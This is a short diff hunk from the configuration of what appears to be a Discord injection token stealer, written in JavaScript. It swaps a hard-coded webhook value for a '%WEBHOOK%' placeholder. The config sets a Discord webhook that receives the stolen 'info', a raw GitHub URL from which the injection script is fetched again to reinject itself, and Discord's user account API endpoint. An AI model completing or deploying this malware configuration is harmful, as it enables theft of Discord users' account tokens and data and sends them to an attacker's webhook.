@@ -12,7 +12,7 @@ const config = {
   embed_name: "Discord Injection [Python]", //name of the webhook thats gonna send the info
   embed_icon:"https://cdn.discordapp.com/attachments/972488565994954782/976000116810973204/app-4.png", //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5576300, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  webhook: "~~ImageGrabber~~", //your discord webhook there obviously
+  webhook: "%WEBHOOK%", //your discord webhook there obviously
   injection_url: "https://raw.githubusercontent.com/xrevix/injection/main/injection.js", //injection url for when it reinjects
   /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
   api: "https://discord.com/api/v9/users/@me",
